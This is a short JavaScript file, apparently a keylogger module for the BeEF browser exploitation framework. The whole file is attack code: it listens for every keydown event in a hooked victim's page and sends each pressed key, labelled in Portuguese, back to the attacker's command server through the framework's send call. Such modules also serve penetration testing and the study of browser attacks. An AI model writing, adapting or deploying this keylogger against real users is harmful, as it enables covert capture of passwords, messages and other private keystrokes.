// modules/keylogger.js

beef.execute(function() {
  document.addEventListener('keydown', function(event) {
    var key = event.key;
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Tecla pressionada: ' + key);
  });
});
